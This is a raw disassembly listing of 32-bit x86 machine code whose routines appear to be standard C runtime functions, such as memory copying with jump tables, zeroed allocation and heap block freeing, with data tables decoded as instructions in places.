  425f99:	jne    0x425fb1
  425f9b:	cmp    DWORD PTR [esp+0x8],eax
  425f9f:	je     0x425fb1
  425fa1:	push   DWORD PTR [esp+0x4]
  425fa5:	call   0x427b72
  425faa:	test   eax,eax
  425fac:	pop    ecx
  425fad:	jne    0x425f8d
  425faf:	xor    eax,eax
  425fb1:	ret    
  425fb2:	push   DWORD PTR ds:0x467388
  425fb8:	push   DWORD PTR [esp+0x8]
  425fbc:	call   0x425f86
  425fc1:	pop    ecx
  425fc2:	pop    ecx
  425fc3:	ret    
  425fc4:	int3   
  425fc5:	int3   
  425fc6:	int3   
  425fc7:	int3   
  425fc8:	int3   
  425fc9:	int3   
  425fca:	int3   
  425fcb:	int3   
  425fcc:	int3   
  425fcd:	int3   
  425fce:	int3   
  425fcf:	int3   
  425fd0:	push   ebp
  425fd1:	mov    ebp,esp
  425fd3:	push   edi
  425fd4:	push   esi
  425fd5:	mov    esi,DWORD PTR [ebp+0xc]
  425fd8:	mov    ecx,DWORD PTR [ebp+0x10]
  425fdb:	mov    edi,DWORD PTR [ebp+0x8]
  425fde:	mov    eax,ecx
  425fe0:	mov    edx,ecx
  425fe2:	add    eax,esi
  425fe4:	cmp    edi,esi
  425fe6:	jbe    0x425ff0
  425fe8:	cmp    edi,eax
  425fea:	jb     0x42616c
  425ff0:	test   edi,0x3
  425ff6:	jne    0x42600c
  425ff8:	shr    ecx,0x2
  425ffb:	and    edx,0x3
  425ffe:	cmp    ecx,0x8
  426001:	jb     0x42602c
  426003:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426005:	jmp    DWORD PTR [edx*4+0x42611c]
  42600c:	mov    eax,edi
  42600e:	mov    edx,0x3
  426013:	sub    ecx,0x4
  426016:	jb     0x426024
  426018:	and    eax,0x3
  42601b:	add    ecx,eax
  42601d:	jmp    DWORD PTR [eax*4+0x426030]
  426024:	jmp    DWORD PTR [ecx*4+0x42612c]
  42602b:	nop
  42602c:	jmp    DWORD PTR [ecx*4+0x4260b0]
  426033:	nop
  426034:	inc    eax
  426035:	pusha  
  426036:	inc    edx
  426037:	add    BYTE PTR [eax+eiz*2+0x42],ch
  42603b:	add    BYTE PTR [eax+0x23004260],dl
  426041:	ror    DWORD PTR [edx-0x75f877fa],1
  426047:	inc    esi
  426048:	add    DWORD PTR [eax+0x468a0147],ecx
  42604e:	add    al,cl
  426050:	jmp    0x289e857
  426055:	add    esi,0x3
  426058:	add    edi,0x3
  42605b:	cmp    ecx,0x8
  42605e:	jb     0x42602c
  426060:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426062:	jmp    DWORD PTR [edx*4+0x42611c]
  426069:	lea    ecx,[ecx+0x0]
  42606c:	and    edx,ecx
  42606e:	mov    al,BYTE PTR [esi]
  426070:	mov    BYTE PTR [edi],al
  426072:	mov    al,BYTE PTR [esi+0x1]
  426075:	shr    ecx,0x2
  426078:	mov    BYTE PTR [edi+0x1],al
  42607b:	add    esi,0x2
  42607e:	add    edi,0x2
  426081:	cmp    ecx,0x8
  426084:	jb     0x42602c
  426086:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426088:	jmp    DWORD PTR [edx*4+0x42611c]
  42608f:	nop
  426090:	and    edx,ecx
  426092:	mov    al,BYTE PTR [esi]
  426094:	mov    BYTE PTR [edi],al
  426096:	add    esi,0x1
  426099:	shr    ecx,0x2
  42609c:	add    edi,0x1
  42609f:	cmp    ecx,0x8
  4260a2:	jb     0x42602c
  4260a4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260a6:	jmp    DWORD PTR [edx*4+0x42611c]
  4260ad:	lea    ecx,[ecx+0x0]
  4260b0:	adc    esp,DWORD PTR [ecx+0x42]
  4260b3:	add    BYTE PTR [eax],al
  4260b5:	popa   
  4260b6:	inc    edx
  4260b7:	add    al,bh
  4260b9:	pusha  
  4260ba:	inc    edx
  4260bb:	add    al,dh
  4260bd:	pusha  
  4260be:	inc    edx
  4260bf:	add    al,ch
  4260c1:	pusha  
  4260c2:	inc    edx
  4260c3:	add    al,ah
  4260c5:	pusha  
  4260c6:	inc    edx
  4260c7:	add    al,bl
  4260c9:	pusha  
  4260ca:	inc    edx
  4260cb:	add    al,dl
  4260cd:	pusha  
  4260ce:	inc    edx
  4260cf:	add    BYTE PTR [ebx-0x761b71bc],cl
  4260d5:	inc    esp
  4260d6:	(bad)  
  4260d7:	in     al,0x8b
  4260d9:	inc    esp
  4260da:	mov    gs,eax
  4260dc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4260e0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4260e4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4260e8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4260ec:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4260f0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4260f4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4260f8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4260fc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426100:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426104:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426108:	lea    eax,[ecx*4+0x0]
  42610f:	add    esi,eax
  426111:	add    edi,eax
  426113:	jmp    DWORD PTR [edx*4+0x42611c]
  42611a:	mov    edi,edi
  42611c:	sub    al,0x61
  42611e:	inc    edx
  42611f:	add    BYTE PTR [ecx+eiz*2],dh
  426122:	inc    edx
  426123:	add    BYTE PTR [eax+0x61],al
  426126:	inc    edx
  426127:	add    BYTE PTR [ecx+eiz*2+0x42],dl
  42612b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426131:	leave  
  426132:	ret    
  426133:	nop
  426134:	mov    al,BYTE PTR [esi]
  426136:	mov    BYTE PTR [edi],al
  426138:	mov    eax,DWORD PTR [ebp+0x8]
  42613b:	pop    esi
  42613c:	pop    edi
  42613d:	leave  
  42613e:	ret    
  42613f:	nop
  426140:	mov    al,BYTE PTR [esi]
  426142:	mov    BYTE PTR [edi],al
  426144:	mov    al,BYTE PTR [esi+0x1]
  426147:	mov    BYTE PTR [edi+0x1],al
  42614a:	mov    eax,DWORD PTR [ebp+0x8]
  42614d:	pop    esi
  42614e:	pop    edi
  42614f:	leave  
  426150:	ret    
  426151:	lea    ecx,[ecx+0x0]
  426154:	mov    al,BYTE PTR [esi]
  426156:	mov    BYTE PTR [edi],al
  426158:	mov    al,BYTE PTR [esi+0x1]
  42615b:	mov    BYTE PTR [edi+0x1],al
  42615e:	mov    al,BYTE PTR [esi+0x2]
  426161:	mov    BYTE PTR [edi+0x2],al
  426164:	mov    eax,DWORD PTR [ebp+0x8]
  426167:	pop    esi
  426168:	pop    edi
  426169:	leave  
  42616a:	ret    
  42616b:	nop
  42616c:	lea    esi,[ecx+esi*1-0x4]
  426170:	lea    edi,[ecx+edi*1-0x4]
  426174:	test   edi,0x3
  42617a:	jne    0x4261a0
  42617c:	shr    ecx,0x2
  42617f:	and    edx,0x3
  426182:	cmp    ecx,0x8
  426185:	jb     0x426194
  426187:	std    
  426188:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42618a:	cld    
  42618b:	jmp    DWORD PTR [edx*4+0x4262b8]
  426192:	mov    edi,edi
  426194:	neg    ecx
  426196:	jmp    DWORD PTR [ecx*4+0x426268]
  42619d:	lea    ecx,[ecx+0x0]
  4261a0:	mov    eax,edi
  4261a2:	mov    edx,0x3
  4261a7:	cmp    ecx,0x4
  4261aa:	jb     0x4261b8
  4261ac:	and    eax,0x3
  4261af:	sub    ecx,eax
  4261b1:	jmp    DWORD PTR [eax*4+0x4261bc]
  4261b8:	jmp    DWORD PTR [ecx*4+0x4262b8]
  4261bf:	nop
  4261c0:	int3   
  4261c1:	popa   
  4261c2:	inc    edx
  4261c3:	add    al,dh
  4261c5:	popa   
  4261c6:	inc    edx
  4261c7:	add    BYTE PTR [eax],bl
  4261c9:	bound  eax,QWORD PTR [edx+0x0]
  4261cc:	mov    al,BYTE PTR [esi+0x3]
  4261cf:	and    edx,ecx
  4261d1:	mov    BYTE PTR [edi+0x3],al
  4261d4:	sub    esi,0x1
  4261d7:	shr    ecx,0x2
  4261da:	sub    edi,0x1
  4261dd:	cmp    ecx,0x8
  4261e0:	jb     0x426194
  4261e2:	std    
  4261e3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261e5:	cld    
  4261e6:	jmp    DWORD PTR [edx*4+0x4262b8]
  4261ed:	lea    ecx,[ecx+0x0]
  4261f0:	mov    al,BYTE PTR [esi+0x3]
  4261f3:	and    edx,ecx
  4261f5:	mov    BYTE PTR [edi+0x3],al
  4261f8:	mov    al,BYTE PTR [esi+0x2]
  4261fb:	shr    ecx,0x2
  4261fe:	mov    BYTE PTR [edi+0x2],al
  426201:	sub    esi,0x2
  426204:	sub    edi,0x2
  426207:	cmp    ecx,0x8
  42620a:	jb     0x426194
  42620c:	std    
  42620d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42620f:	cld    
  426210:	jmp    DWORD PTR [edx*4+0x4262b8]
  426217:	nop
  426218:	mov    al,BYTE PTR [esi+0x3]
  42621b:	and    edx,ecx
  42621d:	mov    BYTE PTR [edi+0x3],al
  426220:	mov    al,BYTE PTR [esi+0x2]
  426223:	mov    BYTE PTR [edi+0x2],al
  426226:	mov    al,BYTE PTR [esi+0x1]
  426229:	shr    ecx,0x2
  42622c:	mov    BYTE PTR [edi+0x1],al
  42622f:	sub    esi,0x3
  426232:	sub    edi,0x3
  426235:	cmp    ecx,0x8
  426238:	jb     0x426194
  42623e:	std    
  42623f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426241:	cld    
  426242:	jmp    DWORD PTR [edx*4+0x4262b8]
  426249:	lea    ecx,[ecx+0x0]
  42624c:	ins    BYTE PTR es:[edi],dx
  42624d:	bound  eax,QWORD PTR [edx+0x0]
  426250:	je     0x4262b4
  426252:	inc    edx
  426253:	add    BYTE PTR [edx+eiz*2+0x42],bh
  426257:	add    BYTE PTR [edx+eiz*2+0x628c0042],al
  42625e:	inc    edx
  42625f:	add    BYTE PTR [edx+eiz*2+0x629c0042],dl
  426266:	inc    edx
  426267:	add    BYTE PTR [edi-0x74ffbd9e],ch
  42626d:	inc    esp
  42626e:	mov    ds,WORD PTR [ecx+ecx*4]
  426271:	inc    esp
  426272:	(bad)  
  426273:	sbb    al,0x8b
  426275:	inc    esp
  426276:	mov    ds,WORD PTR [eax]
  426278:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42627c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426280:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426284:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426288:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42628c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426290:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426294:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426298:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42629c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4262a0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4262a4:	lea    eax,[ecx*4+0x0]
  4262ab:	add    esi,eax
  4262ad:	add    edi,eax
  4262af:	jmp    DWORD PTR [edx*4+0x4262b8]
  4262b6:	mov    edi,edi
  4262b8:	enter  0x4262,0x0
  4262bc:	shl    BYTE PTR [edx+0x42],1
  4262bf:	add    al,ah
  4262c1:	bound  eax,QWORD PTR [edx+0x0]
  4262c4:	hlt    
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	mov    eax,DWORD PTR [ebp+0x8]
  4262cb:	pop    esi
  4262cc:	pop    edi
  4262cd:	leave  
  4262ce:	ret    
  4262cf:	nop
  4262d0:	mov    al,BYTE PTR [esi+0x3]
  4262d3:	mov    BYTE PTR [edi+0x3],al
  4262d6:	mov    eax,DWORD PTR [ebp+0x8]
  4262d9:	pop    esi
  4262da:	pop    edi
  4262db:	leave  
  4262dc:	ret    
  4262dd:	lea    ecx,[ecx+0x0]
  4262e0:	mov    al,BYTE PTR [esi+0x3]
  4262e3:	mov    BYTE PTR [edi+0x3],al
  4262e6:	mov    al,BYTE PTR [esi+0x2]
  4262e9:	mov    BYTE PTR [edi+0x2],al
  4262ec:	mov    eax,DWORD PTR [ebp+0x8]
  4262ef:	pop    esi
  4262f0:	pop    edi
  4262f1:	leave  
  4262f2:	ret    
  4262f3:	nop
  4262f4:	mov    al,BYTE PTR [esi+0x3]
  4262f7:	mov    BYTE PTR [edi+0x3],al
  4262fa:	mov    al,BYTE PTR [esi+0x2]
  4262fd:	mov    BYTE PTR [edi+0x2],al
  426300:	mov    al,BYTE PTR [esi+0x1]
  426303:	mov    BYTE PTR [edi+0x1],al
  426306:	mov    eax,DWORD PTR [ebp+0x8]
  426309:	pop    esi
  42630a:	pop    edi
  42630b:	leave  
  42630c:	ret    
  42630d:	push   DWORD PTR [esp+0x4]
  426311:	call   DWORD PTR ds:0x4290e0
  426317:	xor    eax,eax
  426319:	inc    eax
  42631a:	ret    0x8
  42631d:	push   0x10
  42631f:	push   0x429618
  426324:	call   0x425290
  426329:	mov    eax,ds:0x467348
  42632e:	test   eax,eax
  426330:	jne    0x426369
  426332:	cmp    DWORD PTR ds:0x467084,0x1
  426339:	je     0x42635f
  42633b:	push   0x429604
  426340:	call   DWORD PTR ds:0x429044
  426346:	test   eax,eax
  426348:	je     0x42635f
  42634a:	push   0x4295dc
  42634f:	push   eax
  426350:	call   DWORD PTR ds:0x429048
  426356:	mov    ds:0x467348,eax
  42635b:	test   eax,eax
  42635d:	jne    0x426369
  42635f:	mov    eax,0x42630d
  426364:	mov    ds:0x467348,eax
  426369:	and    DWORD PTR [ebp-0x4],0x0
  42636d:	push   DWORD PTR [ebp+0xc]
  426370:	push   DWORD PTR [ebp+0x8]
  426373:	call   eax
  426375:	mov    DWORD PTR [ebp-0x1c],eax
  426378:	jmp    0x42639e
  42637a:	mov    eax,DWORD PTR [ebp-0x14]
  42637d:	mov    eax,DWORD PTR [eax]
  42637f:	mov    eax,DWORD PTR [eax]
  426381:	mov    DWORD PTR [ebp-0x20],eax
  426384:	xor    eax,eax
  426386:	inc    eax
  426387:	ret    
  426388:	mov    esp,DWORD PTR [ebp-0x18]
  42638b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426392:	jne    0x42639c
  426394:	push   0x8
  426396:	call   DWORD PTR ds:0x4290b0
  42639c:	xor    eax,eax
  42639e:	or     DWORD PTR [ebp-0x4],0xffffffff
  4263a2:	call   0x4252cb
  4263a7:	ret    
  4263a8:	push   0x10
  4263aa:	push   0x429628
  4263af:	call   0x425290
  4263b4:	mov    esi,DWORD PTR [ebp+0x8]
  4263b7:	imul   esi,DWORD PTR [ebp+0xc]
  4263bb:	mov    DWORD PTR [ebp-0x1c],esi
  4263be:	test   esi,esi
  4263c0:	jne    0x4263c3
  4263c2:	inc    esi
  4263c3:	xor    edi,edi
  4263c5:	mov    DWORD PTR [ebp-0x20],edi
  4263c8:	cmp    esi,0xffffffe0
  4263cb:	ja     0x426432
  4263cd:	cmp    DWORD PTR ds:0x467704,0x3
  4263d4:	jne    0x42641d
  4263d6:	add    esi,0xf
  4263d9:	and    esi,0xfffffff0
  4263dc:	mov    DWORD PTR [ebp+0xc],esi
  4263df:	mov    ebx,DWORD PTR [ebp-0x1c]
  4263e2:	cmp    ebx,DWORD PTR ds:0x4674c4
  4263e8:	ja     0x42641d
  4263ea:	push   0x4
  4263ec:	call   0x42544f
  4263f1:	pop    ecx
  4263f2:	and    DWORD PTR [ebp-0x4],edi
  4263f5:	push   ebx
  4263f6:	call   0x426e51
  4263fb:	pop    ecx
  4263fc:	mov    DWORD PTR [ebp-0x20],eax
  4263ff:	or     DWORD PTR [ebp-0x4],0xffffffff
  426403:	call   0x426452
  426408:	mov    edi,DWORD PTR [ebp-0x20]
  42640b:	test   edi,edi
  42640d:	je     0x426421
  42640f:	push   DWORD PTR [ebp-0x1c]
  426412:	push   0x0
  426414:	push   edi
  426415:	call   0x427b90
  42641a:	add    esp,0xc
  42641d:	test   edi,edi
  42641f:	jne    0x42645b
  426421:	push   esi
  426422:	push   0x8
  426424:	push   DWORD PTR ds:0x467700
  42642a:	call   DWORD PTR ds:0x4290dc
  426430:	mov    edi,eax
  426432:	test   edi,edi
  426434:	jne    0x42645b
  426436:	cmp    DWORD PTR ds:0x467388,edi
  42643c:	je     0x42645b
  42643e:	push   esi
  42643f:	call   0x427b72
  426444:	pop    ecx
  426445:	test   eax,eax
  426447:	jne    0x4263c3
  42644d:	jmp    0x42645d
  42644f:	mov    esi,DWORD PTR [ebp+0xc]
  426452:	push   0x4
  426454:	call   0x4253bb
  426459:	pop    ecx
  42645a:	ret    
  42645b:	mov    eax,edi
  42645d:	call   0x4252cb
  426462:	ret    
  426463:	push   esi
  426464:	mov    esi,DWORD PTR [esp+0x8]
  426468:	mov    eax,DWORD PTR [esi+0x3c]
  42646b:	push   edi
  42646c:	xor    edi,edi
  42646e:	cmp    eax,DWORD PTR ds:0x467394
  426474:	je     0x4264d9
  426476:	cmp    eax,edi
  426478:	je     0x4264d9
  42647a:	mov    eax,DWORD PTR [esi+0x2c]
  42647d:	cmp    DWORD PTR [eax],edi
  42647f:	jne    0x4264d9
  426481:	mov    eax,DWORD PTR [esi+0x34]
  426484:	cmp    eax,edi
  426486:	je     0x4264a4
  426488:	cmp    DWORD PTR [eax],edi
  42648a:	jne    0x4264a4
  42648c:	cmp    eax,DWORD PTR ds:0x4674b0
  426492:	je     0x4264a4
  426494:	push   eax
  426495:	call   0x425e9a
  42649a:	push   DWORD PTR [esi+0x3c]
  42649d:	call   0x427ddf
  4264a2:	pop    ecx
  4264a3:	pop    ecx
  4264a4:	mov    eax,DWORD PTR [esi+0x30]
  4264a7:	cmp    eax,edi
  4264a9:	je     0x4264c7
  4264ab:	cmp    DWORD PTR [eax],edi
  4264ad:	jne    0x4264c7
  4264af:	cmp    eax,DWORD PTR ds:0x4674b4
  4264b5:	je     0x4264c7
  4264b7:	push   eax
  4264b8:	call   0x425e9a
  4264bd:	push   DWORD PTR [esi+0x3c]
  4264c0:	call   0x427d80
  4264c5:	pop    ecx
  4264c6:	pop    ecx
  4264c7:	push   DWORD PTR [esi+0x2c]
  4264ca:	call   0x425e9a
  4264cf:	push   DWORD PTR [esi+0x3c]
  4264d2:	call   0x425e9a
  4264d7:	pop    ecx
  4264d8:	pop    ecx
  4264d9:	mov    eax,DWORD PTR [esi+0x40]
  4264dc:	cmp    eax,DWORD PTR ds:0x4674ac
  4264e2:	je     0x4264fc
  4264e4:	cmp    eax,edi
  4264e6:	je     0x4264fc
  4264e8:	cmp    DWORD PTR [eax],edi
  4264ea:	jne    0x4264fc
  4264ec:	push   eax
  4264ed:	call   0x425e9a
  4264f2:	push   DWORD PTR [esi+0x44]
  4264f5:	call   0x425e9a
  4264fa:	pop    ecx
  4264fb:	pop    ecx
  4264fc:	mov    eax,DWORD PTR [esi+0x50]
  4264ff:	cmp    eax,DWORD PTR ds:0x467390
  426505:	je     0x426523
  426507:	cmp    eax,edi
  426509:	je     0x426523
  42650b:	cmp    DWORD PTR [eax+0xb4],edi
  426511:	jne    0x426523
  426513:	push   eax
  426514:	call   0x427bf0
  426519:	push   DWORD PTR [esi+0x50]
  42651c:	call   0x425e9a
  426521:	pop    ecx
  426522:	pop    ecx
  426523:	push   esi
  426524:	call   0x425e9a
  426529:	pop    ecx
  42652a:	pop    edi
  42652b:	pop    esi
  42652c:	ret    
  42652d:	push   esi
  42652e:	call   0x425145
  426533:	mov    esi,eax
  426535:	mov    eax,DWORD PTR [esi+0x64]
  426538:	cmp    eax,DWORD PTR ds:0x466b4c
  42653e:	je     0x4265ea
  426544:	test   eax,eax
  426546:	je     0x426577
  426548:	mov    ecx,DWORD PTR [eax+0x2c]
  42654b:	dec    DWORD PTR [eax]
  42654d:	test   ecx,ecx
  42654f:	je     0x426553
  426551:	dec    DWORD PTR [ecx]
  426553:	mov    ecx,DWORD PTR [eax+0x34]
  426556:	test   ecx,ecx
  426558:	je     0x42655c
  42655a:	dec    DWORD PTR [ecx]
  42655c:	mov    ecx,DWORD PTR [eax+0x30]
  42655f:	test   ecx,ecx
  426561:	je     0x426565
  426563:	dec    DWORD PTR [ecx]
  426565:	mov    ecx,DWORD PTR [eax+0x40]
  426568:	test   ecx,ecx
  42656a:	je     0x42656e
  42656c:	dec    DWORD PTR [ecx]
  42656e:	mov    ecx,DWORD PTR [eax+0x4c]
  426571:	dec    DWORD PTR [ecx+0xb4]
  426577:	mov    ecx,DWORD PTR ds:0x466b4c
  42657d:	mov    DWORD PTR [esi+0x64],ecx
  426580:	mov    ecx,DWORD PTR ds:0x466b4c
  426586:	inc    DWORD PTR [ecx]
  426588:	mov    ecx,DWORD PTR ds:0x466b4c
  42658e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426591:	test   ecx,ecx
  426593:	je     0x426597
  426595:	inc    DWORD PTR [ecx]
  426597:	mov    ecx,DWORD PTR ds:0x466b4c
  42659d:	mov    ecx,DWORD PTR [ecx+0x34]
  4265a0:	test   ecx,ecx
  4265a2:	je     0x4265a6
  4265a4:	inc    DWORD PTR [ecx]
  4265a6:	mov    ecx,DWORD PTR ds:0x466b4c
  4265ac:	mov    ecx,DWORD PTR [ecx+0x30]
  4265af:	test   ecx,ecx
  4265b1:	je     0x4265b5
  4265b3:	inc    DWORD PTR [ecx]
  4265b5:	mov    ecx,DWORD PTR ds:0x466b4c
  4265bb:	mov    ecx,DWORD PTR [ecx+0x40]
  4265be:	test   ecx,ecx
  4265c0:	je     0x4265c4
  4265c2:	inc    DWORD PTR [ecx]
  4265c4:	mov    ecx,DWORD PTR ds:0x466b4c
  4265ca:	mov    ecx,DWORD PTR [ecx+0x4c]
  4265cd:	inc    DWORD PTR [ecx+0xb4]
  4265d3:	test   eax,eax
  4265d5:	je     0x4265ea
  4265d7:	cmp    DWORD PTR [eax],0x0
  4265da:	jne    0x4265ea
  4265dc:	cmp    eax,0x466af8
  4265e1:	je     0x4265ea
  4265e3:	push   eax
  4265e4:	call   0x426463
  4265e9:	pop    ecx
  4265ea:	mov    eax,DWORD PTR [esi+0x64]
  4265ed:	pop    esi
  4265ee:	ret    
  4265ef:	push   0xc
  4265f1:	push   0x4297b8
  4265f6:	call   0x425290
  4265fb:	push   0xc
  4265fd:	call   0x42544f
  426602:	pop    ecx
  426603:	and    DWORD PTR [ebp-0x4],0x0
  426607:	call   0x42652d
  42660c:	mov    DWORD PTR [ebp-0x1c],eax
  42660f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426613:	call   0x426621
  426618:	mov    eax,DWORD PTR [ebp-0x1c]
  42661b:	call   0x4252cb
  426620:	ret    
  426621:	push   0xc
  426623:	call   0x4253bb
  426628:	pop    ecx
  426629:	ret    
  42662a:	push   0x140
  42662f:	push   0x0
  426631:	push   DWORD PTR ds:0x467700
  426637:	call   DWORD PTR ds:0x4290dc
  42663d:	test   eax,eax
  42663f:	mov    ds:0x4674c0,eax
  426644:	jne    0x426647
  426646:	ret    
  426647:	mov    ecx,DWORD PTR [esp+0x4]
  42664b:	and    DWORD PTR ds:0x4674b8,0x0
  426652:	and    DWORD PTR ds:0x4674bc,0x0
  426659:	mov    ds:0x4674c8,eax
  42665e:	xor    eax,eax
  426660:	mov    DWORD PTR ds:0x4674c4,ecx
  426666:	mov    DWORD PTR ds:0x4674cc,0x10
  426670:	inc    eax
  426671:	ret    
  426672:	mov    eax,ds:0x4674bc
  426677:	lea    ecx,[eax+eax*4]
  42667a:	mov    eax,ds:0x4674c0
  42667f:	lea    ecx,[eax+ecx*4]
  426682:	jmp    0x426696
  426684:	mov    edx,DWORD PTR [esp+0x4]
  426688:	sub    edx,DWORD PTR [eax+0xc]
  42668b:	cmp    edx,0x100000
  426691:	jb     0x42669c
  426693:	add    eax,0x14
  426696:	cmp    eax,ecx
  426698:	jb     0x426684
  42669a:	xor    eax,eax
  42669c:	ret    
  42669d:	push   ebp
  42669e:	mov    ebp,esp
  4266a0:	sub    esp,0x10
  4266a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4266a6:	mov    eax,DWORD PTR [ecx+0x10]
  4266a9:	push   esi
  4266aa:	mov    esi,DWORD PTR [ebp+0xc]
  4266ad:	push   edi
  4266ae:	mov    edi,esi
  4266b0:	sub    edi,DWORD PTR [ecx+0xc]
  4266b3:	add    esi,0xfffffffc
  4266b6:	shr    edi,0xf
  4266b9:	mov    ecx,edi
  4266bb:	imul   ecx,ecx,0x204
  4266c1:	lea    ecx,[ecx+eax*1+0x144]
  4266c8:	mov    DWORD PTR [ebp-0x10],ecx
  4266cb:	mov    ecx,DWORD PTR [esi]
  4266cd:	dec    ecx
  4266ce:	test   cl,0x1
  4266d1:	mov    DWORD PTR [ebp-0x4],ecx
  4266d4:	jne    0x4269b1
  4266da:	push   ebx
  4266db:	lea    ebx,[ecx+esi*1]
  4266de:	mov    edx,DWORD PTR [ebx]
  4266e0:	mov    DWORD PTR [ebp-0xc],edx
  4266e3:	mov    edx,DWORD PTR [esi-0x4]
  4266e6:	mov    DWORD PTR [ebp-0x8],edx
  4266e9:	mov    edx,DWORD PTR [ebp-0xc]
  4266ec:	test   dl,0x1
  4266ef:	mov    DWORD PTR [ebp+0xc],ebx
  4266f2:	jne    0x426768
  4266f4:	sar    edx,0x4
  4266f7:	dec    edx
  4266f8:	cmp    edx,0x3f
  4266fb:	jbe    0x426700
  4266fd:	push   0x3f
  4266ff:	pop    edx
  426700:	mov    ecx,DWORD PTR [ebx+0x4]
  426703:	cmp    ecx,DWORD PTR [ebx+0x8]
  426706:	jne    0x42674a
  426708:	cmp    edx,0x20
  42670b:	mov    ebx,0x80000000
  426710:	jae    0x42672b
  426712:	mov    ecx,edx
  426714:	shr    ebx,cl
  426716:	lea    ecx,[edx+eax*1+0x4]
  42671a:	not    ebx
  42671c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  426720:	dec    BYTE PTR [ecx]
  426722:	jne    0x426747
  426724:	mov    ecx,DWORD PTR [ebp+0x8]
  426727:	and    DWORD PTR [ecx],ebx
  426729:	jmp    0x426747
  42672b:	lea    ecx,[edx-0x20]
  42672e:	shr    ebx,cl
  426730:	lea    ecx,[edx+eax*1+0x4]
  426734:	not    ebx
  426736:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  42673d:	dec    BYTE PTR [ecx]
  42673f:	jne    0x426747
  426741:	mov    ecx,DWORD PTR [ebp+0x8]
  426744:	and    DWORD PTR [ecx+0x4],ebx
  426747:	mov    ebx,DWORD PTR [ebp+0xc]
  42674a:	mov    edx,DWORD PTR [ebx+0x8]
  42674d:	mov    ebx,DWORD PTR [ebx+0x4]
  426750:	mov    ecx,DWORD PTR [ebp-0x4]
  426753:	add    ecx,DWORD PTR [ebp-0xc]
  426756:	mov    DWORD PTR [edx+0x4],ebx
  426759:	mov    edx,DWORD PTR [ebp+0xc]
  42675c:	mov    ebx,DWORD PTR [edx+0x4]
  42675f:	mov    edx,DWORD PTR [edx+0x8]
  426762:	mov    DWORD PTR [ebx+0x8],edx
  426765:	mov    DWORD PTR [ebp-0x4],ecx
  426768:	mov    edx,ecx
  42676a:	sar    edx,0x4
  42676d:	dec    edx
  42676e:	cmp    edx,0x3f
  426771:	jbe    0x426776
  426773:	push   0x3f
  426775:	pop    edx
  426776:	mov    ebx,DWORD PTR [ebp-0x8]
  426779:	and    ebx,0x1
  42677c:	mov    DWORD PTR [ebp-0xc],ebx
  42677f:	jne    0x426814
  426785:	sub    esi,DWORD PTR [ebp-0x8]
  426788:	mov    ebx,DWORD PTR [ebp-0x8]
  42678b:	sar    ebx,0x4
  42678e:	push   0x3f
  426790:	mov    DWORD PTR [ebp+0xc],esi
  426793:	dec    ebx
  426794:	pop    esi
  426795:	cmp    ebx,esi
  426797:	jbe    0x42679b
  426799:	mov    ebx,esi
  42679b:	add    ecx,DWORD PTR [ebp-0x8]
  42679e:	mov    edx,ecx
  4267a0:	sar    edx,0x4
  4267a3:	dec    edx
  4267a4:	cmp    edx,esi
  4267a6:	mov    DWORD PTR [ebp-0x4],ecx
  4267a9:	jbe    0x4267ad
  4267ab:	mov    edx,esi
  4267ad:	cmp    ebx,edx
  4267af:	je     0x42680f
  4267b1:	mov    ecx,DWORD PTR [ebp+0xc]
  4267b4:	mov    esi,DWORD PTR [ecx+0x4]
  4267b7:	cmp    esi,DWORD PTR [ecx+0x8]
  4267ba:	jne    0x4267f7
  4267bc:	cmp    ebx,0x20
  4267bf:	mov    esi,0x80000000
  4267c4:	jae    0x4267dd
  4267c6:	mov    ecx,ebx
  4267c8:	shr    esi,cl
  4267ca:	not    esi
  4267cc:	and    DWORD PTR [eax+edi*4+0x44],esi
  4267d0:	dec    BYTE PTR [ebx+eax*1+0x4]
  4267d4:	jne    0x4267f7
  4267d6:	mov    ecx,DWORD PTR [ebp+0x8]
  4267d9:	and    DWORD PTR [ecx],esi
  4267db:	jmp    0x4267f7
  4267dd:	lea    ecx,[ebx-0x20]
  4267e0:	shr    esi,cl
  4267e2:	not    esi
  4267e4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4267eb:	dec    BYTE PTR [ebx+eax*1+0x4]
  4267ef:	jne    0x4267f7
  4267f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4267f4:	and    DWORD PTR [ecx+0x4],esi
  4267f7:	mov    ecx,DWORD PTR [ebp+0xc]
